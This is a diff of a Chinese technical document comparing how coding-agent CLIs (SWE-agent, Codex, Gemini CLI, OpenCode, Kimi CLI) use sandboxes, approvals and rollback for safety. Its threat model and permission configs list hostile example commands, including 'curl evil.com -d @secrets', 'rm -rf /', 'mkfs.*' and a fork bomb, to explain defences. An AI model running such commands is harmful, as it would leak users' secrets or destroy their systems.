@@ -1,463 +1,189 @@
-# 安全控制机制对比
+# 安全控制机制
 
-## 1. 概念定义
+## TL;DR
 
-**安全控制（Safety Control）** 是 Agent CLI 保护用户系统和数据安全的重要机制，用于限制 Agent 的操作范围，防止恶意或意外的破坏性行为。
-
-### 核心要素
-
-- **沙箱（Sandbox）**：隔离执行环境，限制资源访问
-- **权限确认（Approval）**：危险操作前的用户确认
-- **命令过滤（Command Filter）**：禁止或限制特定命令
-- **网络隔离（Network Isolation）**：控制网络访问权限
-- **文件系统保护（Filesystem Protection）**：限制文件读写范围
+Code Agent 能执行 shell 命令、读写文件 —— 这意味着一行错误指令就可能删除重要数据或破坏系统。安全控制的核心是：**在 LLM 犯错之前拦截**。各项目选择了不同层次的防御策略，从"隔离执行环境"到"事前用户确认"再到"事后回滚"。
 
 ---
 
-## 2. 各 Agent 实现
+## 1. 威胁模型：Agent 的危险操作有哪些？
 
-### 2.1 SWE-agent
-
-**实现概述**
-
-SWE-agent 使用 **Docker 沙箱 + 命令过滤** 的双重保护机制。通过容器隔离执行环境，同时提供命令级别的过滤能力。
-
-**架构图**
-
-```
-┌─────────────────────────────────────────────────────────┐
-│  Host System (宿主机)                                     │
-│  ┌─────────────────────────────────────────────────────┐│
-│  │ Docker Container (容器)                             ││
-│  │ ├── Isolated Filesystem       隔离文件系统          ││
-│  │ ├── Resource Limits             资源限制            ││
-│  │ └── Network (可选)              网络控制            ││
-│  └─────────────────────────────────────────────────────┘│
-└─────────────────────────────────────────────────────────┘
-                           │
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│  Command Filter (命令过滤层)                              │
-│  ├── filter blocklist           阻止列表              │
-│  ├── require explicit confirmation 需确认命令         │
-│  └── logging                    审计日志              │
-└─────────────────────────────────────────────────────────┘
+```mermaid
+graph LR
+    subgraph 文件系统风险
+        F1["rm -rf /\n删除整个系统"]
+        F2["覆盖重要配置文件\n~/.ssh/authorized_keys"]
+        F3["泄漏敏感数据\n读取 .env 文件后发送"]
+    end
+    subgraph 命令执行风险
+        C1["网络扫描 / 端口开放\nAttack surface 增大"]
+        C2["安装恶意软件\npip install malware"]
+        C3["数据外传\ncurl evil.com -d @secrets"]
+    end
+    subgraph 资源风险
+        R1["无限循环\nfork bomb"]
+        R2["大量写入磁盘\n填满文件系统"]
+    end
 ```
 
-**关键代码位置**
+**核心矛盾：** Agent 需要足够多的权限才能完成任务（读写代码、运行测试），但权限太大会有风险。安全设计本质是在**能力**和**安全**之间找平衡点。
 
-| 组件 | 文件路径 | 行号 | 说明 |
-|------|----------|------|------|
-| Docker Env | `sweagent/environment/swe_env.py` | 1 | 容器管理 |
-| Command Filter | `sweagent/tools/tools.py` | 280 | 命令过滤 |
-| Config | `sweagent/tools/config.py` | 50 | 安全配置 |
+---
 
-**配置示例**
+## 2. 三层防御体系
 
-```yaml
-# 命令过滤配置
-filter:
-  blocklist:
-    - "rm -rf /"
-    - "mkfs.*"
-  require_confirmation:
-    - "rm .*"
-    - "chmod .*"
+所有项目的安全控制都可以归纳为三层（层次越低，保护越彻底，但成本越高）：
+
+```mermaid
+graph TD
+    A["第一层：环境隔离\n（最强，独立沙箱）"] --> B["第二层：操作确认\n（折中，人工审批）"]
+    B --> C["第三层：状态回滚\n（补救，出错后恢复）"]
+
+    A1["Docker 容器\n（SWE-agent）\nOS 级完全隔离"] --> A
+    A2["Seatbelt/Landlock\n（Codex）\n系统调用过滤"] --> A
+    B1["Kind 分类审批\n（Gemini CLI）"] --> B
+    B2["PermissionNext 规则\n（OpenCode）"] --> B
+    B3["简单确认列表\n（大多数项目）"] --> B
+    C1["Checkpoint 回滚\n（Kimi CLI）"] --> C
 ```
 
-### 2.2 Codex
+---
 
-**实现概述**
+## 3. 各项目的安全机制
 
-Codex 使用 **macOS Seatbelt/Landlock + 网络沙箱** 的多层安全架构。通过操作系统级沙箱限制资源访问，同时提供灵活的网络隔离策略。
+### Codex：OS 级沙箱（最底层，最强）
 
-**架构图**
+Codex 是唯一实现了操作系统级沙箱的项目，**在 agent 运行之前就限制了它能做什么**。
 
-```
-┌─────────────────────────────────────────────────────────┐
-│  Sandbox Layer (沙箱层)                                   │
-│  ┌─────────────────────────────────────────────────────┐│
-│  │ macOS Seatbelt / Linux Landlock                     ││
-│  │ ├── Filesystem readonly         文件系统只读        ││
-│  │ ├── Filesystem writeable        可写目录            ││
-│  │ └── Process restrictions        进程限制            ││
-│  └─────────────────────────────────────────────────────┘│
-└─────────────────────────────────────────────────────────┘
-                           │
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│  Network Sandbox (网络沙箱)                               │
-│  ├── full                       完全网络访问          │
-│  ├── host-only                  仅本地网络            │
-│  └── none                       无网络访问            │
-└─────────────────────────────────────────────────────────┘
-                           │
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│  tool_call_gate (工具调用门控)                            │
-│  ├── is_mutating()              变异检测              │
-│  └── 用户确认 (仅 when 需要)                          │
-└─────────────────────────────────────────────────────────┘
+```mermaid
+flowchart LR
+    Agent["Agent 代码"] -->|"执行命令"| Sandbox["沙箱层\nmacOS Seatbelt /\nLinux Landlock"]
+    Sandbox -->|"允许"| OS["操作系统"]
+    Sandbox -->|"拒绝（系统调用被过滤）"| Error["操作失败"]
 ```
 
-**关键代码位置**
+**macOS Seatbelt**（`codex-rs/core/src/seatbelt.rs:36`）：通过 `sandbox-exec` 工具和 `.sbpl` 策略文件限制进程：
+- 只读路径：除工作目录外的大多数文件系统
+- 网络隔离：三级策略 —— `full`（完全访问）/ `host-only`（仅本机）/ `none`（无网络）
+- 进程限制：防止 fork bomb
 
-| 组件 | 文件路径 | 行号 | 说明 |
-|------|----------|------|------|
-| Sandbox | `codex-rs/core/src/sandbox/` | - | 沙箱实现 |
-| Seatbelt | `codex-rs/core/src/sandbox/seatbelt.rs` | 1 | macOS 沙箱 |
-| Landlock | `codex-rs/core/src/sandbox/landlock.rs` | 1 | Linux 沙箱 |
-| Network | `codex-rs/core/src/sandbox/network.rs` | 50 | 网络策略 |
-| Gate | `codex-rs/core/src/tools/execution.rs` | 100 | 工具门控 |
-
-**沙箱配置**
-
+**关键设计**（`codex-rs/core/src/sandboxing/mod.rs:11`）：
 ```rust
-// Sandbox 配置
-pub struct SandboxConfig {
-    pub sandbox: SandboxType,        // seatbelt / landlock / none
-    pub network: NetworkMode,        // full / host-only / none
-    pub cwd: PathBuf,                // 工作目录
-    pub readonly: Vec<PathBuf>,      // 只读路径
-    pub writeable: Vec<PathBuf>,     // 可写路径
+// SandboxPolicy 枚举
+SandboxPolicy::DangerFullAccess  // 无限制（开发调试用）
+SandboxPolicy::ExternalSandbox { network_access: NetworkAccess::Enabled, .. }
+SandboxPolicy::ReadOnly  // 只读模式（最安全）
+```
+
+**工程取舍：** 最强的隔离，但 macOS 专用（Seatbelt）或 Linux 专用（Landlock），跨平台需要两套实现。沙箱配置错误可能导致合法操作也被拦截。
+
+---
+
+### SWE-agent：Docker 容器隔离（跨平台）
+
+SWE-agent 在 Docker 容器中运行所有工具。容器是完全独立的环境：
+
+```
+宿主机
+├── SWE-agent 进程（控制）
+└── Docker 容器（执行）
+    ├── 独立文件系统（挂载的项目目录）
+    ├── 独立网络（可配置）
+    └── 独立进程空间
+```
+
+即使 Agent 执行了破坏性命令（如 `rm -rf /`），也只影响容器内部，宿主机安全。
+
+**工程取舍：** 跨平台（Linux/macOS/Windows 都能用 Docker），隔离彻底；但容器启动慢（通常需要 5-30 秒），不适合轻量交互场景。
+
+---
+
+### Gemini CLI：Kind 分类 + 策略审批
+
+Gemini CLI 没有环境隔离，但通过工具的 `Kind` 分类实现细粒度权限控制。
+
+```mermaid
+flowchart TD
+    A["Agent 调用工具"] --> B{查看工具 Kind}
+    B -->|"Kind.Read"| C["直接执行\n（只读，安全）"]
+    B -->|"Kind.Write"| D["请求用户确认"]
+    B -->|"Kind.Execute"| E["严格审批流程"]
+    D --> F{用户选择}
+    F -->|"允许"| G["执行"]
+    F -->|"拒绝"| H["拒绝执行"]
+    F -->|"总是允许"| I["记住选择\n后续跳过确认"]
+```
+
+**工程取舍：** 实现简单，不需要额外依赖；但保护依赖"工具的 Kind 设置是否正确"，分错 Kind 会影响安全策略。用户确认有"确认疲劳"问题（频繁确认会让用户倾向于无脑点"允许"）。
+
+---
+
+### OpenCode：规则引擎 + 模式匹配
+
+OpenCode 提供了最灵活的权限系统（`opencode/packages/opencode/src/permission/next.ts:14`）：
+
+```typescript
+// 三种操作
+Action = "allow" | "deny" | "ask"
+
+// 规则示例
+permissions = {
+    "bash": {              // 工具类型
+        "rm -rf *": "deny", // 精确匹配 → 总是拒绝
+        "npm install": "ask", // 精确匹配 → 每次询问
+        "*": "allow"        // 通配符 → 默认允许
+    }
 }
 ```
 
-### 2.3 Gemini CLI
+**规则评估顺序**（`permission/next.ts:236`）：精确匹配 > 模式匹配 > 通配符默认值。
 
-**实现概述**
+`ctx.ask()` 是在工具执行时动态触发的（`tool/tool.ts:22`），工具开发者决定何时请求权限，而不是统一由框架控制。
 
-Gemini CLI 使用 **策略引擎 + 分层权限** 的安全模型。根据工具 Kind 分类进行权限控制，支持细粒度的用户确认策略。
-
-**架构图**
-
-```
-┌─────────────────────────────────────────────────────────┐
-│  Policy Engine (策略引擎)                                 │
-│  ├── allowOnFirstUse            首次使用允许          │
-│  ├── requireApproval            需要确认              │
-│  └── deny                       拒绝                  │
-└─────────────────────────────────────────────────────────┘
-                           │
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│  Tool Kind (工具分类)                                     │
-│  ├── Read (0)                   读取操作              │
-│  ├── Write (1)                  写入操作              │
-│  ├── Mutate (2)                 变异操作              │
-│  └── Execute (3)                执行操作              │
-└─────────────────────────────────────────────────────────┘
-                           │
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│  User Confirmation (用户确认)                             │
-│  ├── 命令行确认 (Y/n)                                   │
-│  ├── IDE 弹窗确认                                       │
-│  └── 可记住选择                                         │
-└─────────────────────────────────────────────────────────┘
-```
-
-**关键代码位置**
-
-| 组件 | 文件路径 | 行号 | 说明 |
-|------|----------|------|------|
-| Kind | `packages/core/src/tools/kind.ts` | 1 | 工具分类 |
-| Policy | `packages/core/src/approval/` | - | 策略引擎 |
-| Confirmation | `packages/core/src/approval/confirm.ts` | 50 | 确认逻辑 |
-
-**策略配置**
-
-```typescript
-// 权限策略配置
-const policy: Policy = {
-  [Kind.Read]: 'allowOnFirstUse',
-  [Kind.Write]: 'requireApproval',
-  [Kind.Mutate]: 'requireApproval',
-  [Kind.Execute]: 'requireApproval',
-};
-```
-
-### 2.4 Kimi CLI
-
-**实现概述**
-
-Kimi CLI 使用 **简单确认机制 + D-Mail 回滚** 的安全策略。通过用户确认控制危险操作，支持通过检查点回滚到安全状态。
-
-**架构图**
-
-```
-┌─────────────────────────────────────────────────────────┐
-│  Tool Execution (工具执行)                                │
-│  ├── 解析工具调用                                       │
-│  ├── 检查是否需要确认                                   │
-│  └── 执行并返回结果                                     │
-└─────────────────────────────────────────────────────────┘
-                           │
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│  Simple Approval (简单确认)                               │
-│  ├── 危险命令列表               预定义列表            │
-│  ├── 用户确认 (Y/n)                                     │
-│  └── 超时处理                                           │
-└─────────────────────────────────────────────────────────┘
-                           │
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│  Checkpoint (检查点)                                      │
-│  ├── checkpoint()               创建检查点            │
-│  └── revert_to(id)              回滚到检查点          │
-└─────────────────────────────────────────────────────────┘
-```
-
-**关键代码位置**
-
-| 组件 | 文件路径 | 行号 | 说明 |
-|------|----------|------|------|
-| Approval | `kimi-cli/src/kimi_cli/agent/kosong.py` | 200 | 确认逻辑 |
-| Checkpoint | `kimi-cli/src/kimi_cli/checkpoint.py` | 1 | 检查点系统 |
-| Dangerous | `kimi-cli/src/kimi_cli/tools/shell.py` | 50 | 危险命令检测 |
-
-### 2.5 OpenCode
-
-**实现概述**
-
-OpenCode 使用 **PermissionNext 系统 + 模式匹配** 的细粒度权限控制。支持基于命令模式的动态权限管理，可配置自动允许、确认或拒绝策略。
-
-**架构图**
-
-```
-┌─────────────────────────────────────────────────────────┐
-│  Permission System (权限系统)                             │
-│  ├── PermissionMode                                             │
-│  │   ├── allow                 允许                     │
-│  │   ├── deny                  拒绝                     │
-│  │   └── ask                   询问                     │
-│  └── PermissionNext                                       │
-│      ├── mode                 当前模式                  │
-│      ├── patterns             匹配模式                  │
-│      └── remember()           记住选择                │
-└─────────────────────────────────────────────────────────┘
-                           │
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│  Pattern Matching (模式匹配)                              │
-│  ├── 命令模式匹配               bash:rm *               │
-│  ├── 文件路径匹配               file:write /etc/*       │
-│  └── 工具类型匹配               tool:bash               │
-└─────────────────────────────────────────────────────────┘
-                           │
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│  ctx.ask() (运行时确认)                                   │
-│  ├── 构建权限请求                                       │
-│  ├── 等待用户响应                                       │
-│  └── 缓存结果                                           │
-└─────────────────────────────────────────────────────────┘
-```
-
-**关键代码位置**
-
-| 组件 | 文件路径 | 行号 | 说明 |
-|------|----------|------|------|
-| Permission | `packages/opencode/src/permission/` | - | 权限系统 |
-| PermissionNext | `packages/opencode/src/permission/types.ts` | 1 | 类型定义 |
-| ctx.ask | `packages/opencode/src/tool/context.ts` | 100 | 运行时确认 |
-| Config | `packages/opencode/src/config/permissions.ts` | 50 | 权限配置 |
-
-**权限配置示例**
-
-```typescript
-// 权限配置
-export const permissions: PermissionConfig = {
-  bash: {
-    mode: 'ask',
-    patterns: [
-      { pattern: 'rm -rf /', mode: 'deny' },
-      { pattern: 'rm *', mode: 'ask' },
-      { pattern: 'ls *', mode: 'allow' },
-    ]
-  },
-  file: {
-    mode: 'ask',
-    patterns: [
-      { pattern: '/etc/*', mode: 'ask' },
-      { pattern: '~/.opencode/*', mode: 'allow' },
-    ]
-  }
-};
-```
+**工程取舍：** 最灵活，可以配置任意规则；但规则复杂度高，用户需要理解配置语法。
 
 ---
 
-## 3. 相同点总结
+### Kimi CLI：D-Mail 回滚作为补充
 
-### 3.1 通用安全原则
+Kimi CLI 的 D-Mail 机制（`src/kimi_cli/soul/denwarenji.py`）是独特的**事后补救**机制：
 
-| 原则 | 说明 |
-|------|------|
-| 最小权限 | 只授予必要的权限 |
-| 用户确认 | 危险操作前需要确认 |
-| 可审计 | 记录操作日志 |
-| 可回滚 | 支持恢复到安全状态 |
+- 执行之前打 Checkpoint
+- 执行有问题时，LLM 可以调用 `SendDMail` 工具回滚到之前的 Checkpoint
+- **注意：** 只回滚 LLM 看到的历史，**不回滚文件系统**
 
-### 3.2 通用保护能力
-
-| 保护维度 | 说明 |
-|----------|------|
-| 文件系统 | 限制读写范围 |
-| 网络访问 | 控制网络权限 |
-| 命令执行 | 过滤危险命令 |
-| 资源使用 | 限制 CPU/内存 |
-
-### 3.3 用户确认流程
-
-```
-┌─────────────┐     ┌─────────────┐     ┌─────────────┐
-│   Agent     │────▶│   检测风险   │────▶│   请求确认   │
-│  执行工具   │     │             │     │             │
-└─────────────┘     └─────────────┘     └──────┬──────┘
-       ▲                                       │
-       │                                       ▼
-       │                              ┌─────────────┐
-       │                              │  用户确认   │
-       │                              │  (Y/n)      │
-       │                              └──────┬──────┘
-       │                                     │
-       └─────────────────────────────────────┘
-                    执行/拒绝
-```
+这不是传统意义的安全隔离，而是给 LLM 一个"反悔"的能力 —— 当探索方向错误时，可以抛弃无效路径。
 
 ---
 
-## 4. 不同点对比
+## 4. 核心工程取舍对比
 
-### 4.1 沙箱机制
+| 方案 | 隔离强度 | 性能影响 | 跨平台 | 实现复杂度 | 用户干预 |
+|------|----------|----------|--------|------------|----------|
+| Docker（SWE-agent）| 最强（OS 级） | 高（容器启动慢） | ✅ | 中 | 无 |
+| Seatbelt/Landlock（Codex）| 强（syscall 过滤）| 低 | ❌ 平台限定 | 高 | 无 |
+| Kind 审批（Gemini CLI）| 弱（仅事前询问）| 无 | ✅ | 低 | 高 |
+| 规则引擎（OpenCode）| 可配置 | 无 | ✅ | 中 | 可配置 |
+| 回滚（Kimi CLI）| 无（事后补救）| 无 | ✅ | 低 | 低 |
 
-| Agent | 沙箱类型 | 实现方式 | 平台支持 |
-|-------|----------|----------|----------|
-| SWE-agent | Docker 容器 | 完整系统隔离 | 跨平台 |
-| Codex | Seatbelt/Landlock | 系统调用过滤 | macOS/Linux |
-| Gemini CLI | 无内置 | 依赖操作系统 | - |
-| Kimi CLI | 无内置 | 依赖操作系统 | - |
-| OpenCode | 无内置 | 依赖操作系统 | - |
-
-### 4.2 权限确认机制
-
-| Agent | 确认粒度 | 确认方式 | 可配置性 |
-|-------|----------|----------|----------|
-| SWE-agent | 命令级 | 预定义规则 | 配置文件 |
-| Codex | 操作级 | is_mutating | 启动参数 |
-| Gemini CLI | 工具级 | Kind 分类 | 策略配置 |
-| Kimi CLI | 命令级 | 简单列表 | 内置规则 |
-| OpenCode | 模式级 | 正则匹配 | 灵活配置 |
-
-### 4.3 网络隔离
-
-| Agent | 网络控制 | 实现方式 |
-|-------|----------|----------|
-| SWE-agent | 可选 | Docker 网络模式 |
-| Codex | 完整支持 | 自定义网络沙箱 |
-| Gemini CLI | 无 | 依赖系统防火墙 |
-| Kimi CLI | 无 | 依赖系统防火墙 |
-| OpenCode | 无 | 依赖系统防火墙 |
-
-### 4.4 文件系统保护
-
-| Agent | 保护方式 | 粒度 |
-|-------|----------|------|
-| SWE-agent | Docker 挂载 | 目录级 |
-| Codex | Seatbelt/Landlock | 路径级 |
-| Gemini CLI | 无内置 | - |
-| Kimi CLI | 无内置 | - |
-| OpenCode | 无内置 | - |
-
-### 4.5 回滚能力
-
-| Agent | 回滚支持 | 实现方式 |
-|-------|----------|----------|
-| SWE-agent | 否 | - |
-| Codex | 否 | - |
-| Gemini CLI | 否 | - |
-| Kimi CLI | 是 | Checkpoint 系统 |
-| OpenCode | 否 | - |
+**选择策略：**
+- 在陌生代码库上执行任意命令 → 优先 Docker 或 Seatbelt
+- 日常开发辅助、只读操作为主 → Kind 分类审批足够
+- 需要精细控制特定命令 → OpenCode 规则引擎
+- 探索性长任务，不怕文件改动但想控制上下文 → Kimi CLI D-Mail
 
 ---
 
-## 5. 源码索引
+## 5. 关键代码索引
 
-### 5.1 沙箱实现
-
-| Agent | 文件路径 | 行号 | 说明 |
-|-------|----------|------|------|
-| SWE-agent | `sweagent/environment/swe_env.py` | 1 | Docker 容器管理 |
-| Codex | `codex-rs/core/src/sandbox/` | - | 沙箱目录 |
-| Codex | `codex-rs/core/src/sandbox/seatbelt.rs` | 1 | macOS Seatbelt |
-| Codex | `codex-rs/core/src/sandbox/landlock.rs` | 1 | Linux Landlock |
-
-### 5.2 权限确认
-
-| Agent | 文件路径 | 行号 | 说明 |
-|-------|----------|------|------|
-| SWE-agent | `sweagent/tools/tools.py` | 280 | 命令过滤 |
-| Codex | `codex-rs/core/src/tools/execution.rs` | 100 | tool_call_gate |
-| Gemini CLI | `packages/core/src/approval/` | - | 策略引擎 |
-| Gemini CLI | `packages/core/src/tools/kind.ts` | 1 | 工具分类 |
-| Kimi CLI | `kimi-cli/src/kimi_cli/agent/kosong.py` | 200 | 确认逻辑 |
-| OpenCode | `packages/opencode/src/permission/` | - | 权限系统 |
-| OpenCode | `packages/opencode/src/tool/context.ts` | 100 | ctx.ask |
-
-### 5.3 配置管理
-
-| Agent | 文件路径 | 行号 | 说明 |
-|-------|----------|------|------|
-| SWE-agent | `sweagent/tools/config.py` | 50 | 安全配置 |
-| Codex | `codex-rs/core/src/config/` | - | 配置模块 |
-| Gemini CLI | `packages/core/src/config/` | - | 配置管理 |
-| OpenCode | `packages/opencode/src/config/permissions.ts` | 50 | 权限配置 |
-
----
-
-## 6. 选择建议
-
-| 场景 | 推荐 Agent | 理由 |
-|------|-----------|------|
-| 最高安全要求 | Codex | Seatbelt/Landlock + 网络沙箱 |
-| 完全隔离环境 | SWE-agent | Docker 容器隔离 |
-| 灵活权限策略 | OpenCode | PermissionNext 模式匹配 |
-| IDE 集成安全 | Gemini CLI | Kind 分类 + 策略引擎 |
-| 可回滚保护 | Kimi CLI | Checkpoint 系统 |
-
----
-
-## 7. 补充：沙箱技术对比
-
-### 7.1 沙箱技术概览
-
-| 技术 | 原理 | 优点 | 缺点 |
+| 项目 | 文件 | 行号 | 说明 |
 |------|------|------|------|
-| Docker | 容器化隔离 | 完整系统隔离 | 性能开销 |
-| Seatbelt | macOS 沙箱 | 系统原生 | macOS 专属 |
-| Landlock | Linux LSM | 轻量级 | Linux 专属 |
-| seccomp | 系统调用过滤 | 精细控制 | 配置复杂 |
-| gVisor | 用户态内核 | 高安全性 | 性能损耗 |
-
-### 7.2 安全建议
-
-**高安全场景**
-
-```
-推荐组合：
-- Codex (Seatbelt/Landlock + 网络沙箱)
-- 配合 Docker 进行完全隔离
-- 使用 readonly 文件系统
-```
-
-**便捷性优先**
-
-```
-推荐组合：
-- OpenCode (灵活的 PermissionNext)
-- Gemini CLI (IDE 集成确认)
-- Kimi CLI (简单确认 + 回滚)
-```
-
+| Codex | `codex-rs/core/src/seatbelt.rs` | 36 | `spawn_command_under_seatbelt()` |
+| Codex | `codex-rs/core/src/seatbelt.rs` | 26 | 基础沙箱策略（`.sbpl` 文件引用） |
+| Codex | `codex-rs/core/src/sandboxing/mod.rs` | 11 | `SandboxPolicy` 三种模式 |
+| Gemini CLI | `packages/core/src/tools/tools.ts` | 312 | `kind` 字段 —— 工具分类 |
+| OpenCode | `packages/opencode/src/permission/next.ts` | 14 | `PermissionNext` 命名空间 |
+| OpenCode | `packages/opencode/src/permission/next.ts` | 25 | `Action` 枚举（allow/deny/ask）|
+| OpenCode | `packages/opencode/src/permission/next.ts` | 236 | `evaluate()` —— 规则评估 |
+| Kimi CLI | `src/kimi_cli/soul/denwarenji.py` | 8 | `DMail` —— 回滚触发器 |
+| Kimi CLI | `src/kimi_cli/soul/context.py` | 80 | `revert_to()` —— 执行回滚 |
